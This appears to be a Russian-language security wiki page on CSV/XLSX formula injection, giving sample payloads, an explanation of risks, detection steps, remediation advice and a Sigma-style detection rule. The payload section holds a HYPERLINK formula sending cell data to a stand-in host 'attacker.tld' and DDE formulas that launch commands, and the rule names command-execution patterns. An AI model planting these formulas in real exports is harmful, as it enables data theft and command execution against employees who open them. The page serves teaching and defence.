# CSV/XLSX formula injection: исполнение формул при экспорте отчётов

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
=HYPERLINK("http://attacker.tld/?"&A1,"Нажмите для получения отчёта")
=cmd|'/C calc'!A1
@SUM(1+1)*cmd|'/C calc'!A1
+1+1
-2+2
```

## Explanation

Если пользовательские данные (имя, комментарий, описание товара, значение
поля формы) попадают в экспортируемый CSV/XLSX без префиксной защиты,
табличный процессор интерпретирует их как формулу. Последствия:

* **фишинг**: `=HYPERLINK("http://attacker/?"&A1)` уводит данные строки
  (и соседние ячейки, на которые ссылается формула) на внешний хост
  при клике аналитика;
* **исполнение команд** в старых/незащищённых конфигурациях: DDE-формулы
  (`=cmd|'/C calc'!A1`), `WEBSERVICE()`, `IMPORTDATA()` в Google Sheets;
* **утечка данных**: формулы, читающие другие листы и отправляющие их наружу;
* **отказ**: тяжёлые формулы, висящие ссылки.

Опасные первые символы: `=`, `+`, `-`, `@`, а также `\t`, `\r` и
комбинации вроде `=+`. Атака направлена не на приложение, а на сотрудника,
который откроет выгрузку, — поэтому её часто недооценивают.

Это же относится к CSV, генерируемым для партнёров, и к «экспорту в Excel»
во внутренних панелях.

## Detection

1. Найдите все точки экспорта (CSV/XLSX/PDF-отчёты, выгрузки для бухгалтерии,
   API-экспорты).
2. Внесите в текстовое поле значение, начинающееся с `=` и `+`
   (например, `=1+1`), экспортируйте и откройте в табличном процессоре
   **в защищённом режиме/на изолированной машине**.
3. Если значение вычислилось (в ячейке `2` вместо текста `=1+1`) —
   уязвимость подтверждена.
4. В коде ищите генерацию CSV конкатенацией строк без префиксной защиты
   (`csv.writer` сам по себе не защищает от формул).
5. В логах/БД: поля, значения которых начинаются с `=`, `+`, `-`, `@`.

## Remediation

- Префиксная защита при экспорте: если значение начинается с `= + - @ \t \r`,
  предварять его одинарной кавычкой `'` или табуляцией; альтернатива —
  заключать значение в двойные кавычки с экранированием.
- Валидация на входе: отклонять или нормализовывать значения, начинающиеся
  с опасных символов (если бизнес-логика позволяет).
- Экспорт в форматах без формул (PDF, JSON) там, где это приемлемо.
- Инструкция для аналитиков: открывать выгрузки с отключёнными внешними
  соединениями и DDE; политикой запретить DDE в Office
   (`Trust Center → External Content`).
- Детект: правило на появление `=`/`+` в начале значений в экспортируемых
  полях (см. ниже) и на аномальные исходящие запросы при открытии отчётов.


## Detection rules

```yaml
title: Признак CSV/formula injection в сохраняемых пользовательских данных
id: b2c3d4e5-0007-4b2c-8d3e-000000000107
status: experimental
description: >-
  Пользовательские значения, начинающиеся с символов формул (= + - @) или
  содержащие DDE/HYPERLINK-конструкции, — признак подготовки атаки на
  сотрудников, открывающих выгрузки.
references:
  - https://owasp.org/www-community/attacks/CSV_Injection
logsource:
  category: application
  product: web
  definition: 'логи приложения с содержимым полей форм или WAF-логи тела запроса'
detection:
  formula_prefix:
    request_body|contains:
      - '=&'
      - '=HYPERLINK'
      - '=cmd|'
      - '=WEBSERVICE'
      - '=IMPORTDATA'
      - '@SUM('
      - '=+cmd'
  dde:
    request_body|contains:
      - "cmd|'/C"
      - 'powershell|'
      - 'ms-msdt:'
  condition: formula_prefix or dde
fields:
  - source_ip
  - request_path
  - user_name
falsepositives:
  - легитимные значения, начинающиеся со знака (математические записи, отрицательные числа)
level: medium
tags:
  - attack.execution
  - attack.t1204.002
  - cwe.1236
```
